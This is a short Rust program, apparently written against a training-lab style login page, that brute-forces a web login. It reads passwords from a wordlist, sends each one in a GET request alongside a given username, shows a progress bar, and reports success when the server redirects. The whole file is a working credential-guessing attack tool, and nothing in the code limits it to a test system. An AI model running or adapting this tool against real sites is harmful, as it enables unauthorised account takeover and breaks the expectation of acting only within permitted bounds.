use indicatif::{ProgressBar, ProgressStyle};
use reqwest::blocking::Client;
use std::env;
use std::fs::File;
use std::io::{self, BufRead};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 4 {
        eprintln!("Usage: {} <url> <username> <passwords.txt>", args[0]);
        return;
    }
    let url = &args[1];
    let username = &args[2];
    let password_file = &args[3];

    let client = Client::new();
    let file = File::open(password_file).expect("Failed to open passwords file");
    let passwords: Vec<String> = io::BufReader::new(file)
        .lines()
        .filter_map(Result::ok)
        .collect();
    let base_url = format!("{}?page=signin&username={}&password=", url, username);

    let pb = ProgressBar::new(passwords.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner} {bar} {pos}/{len} passwords tried")
            .unwrap()
            .progress_chars("=> "),
    );

    for password in passwords {
        let full_url = format!("{}{}&Login=Login", base_url, password);
        if let Ok(resp) = client.get(&full_url).send() {
            if resp.url().as_str() != full_url {
                println!("\n[+] Found password: {}", password);
                pb.finish_with_message("Bruteforce complete!");
                break;
            }
        }
        pb.inc(1);
    }
    pb.finish_with_message("Bruteforce attempt finished.");
}
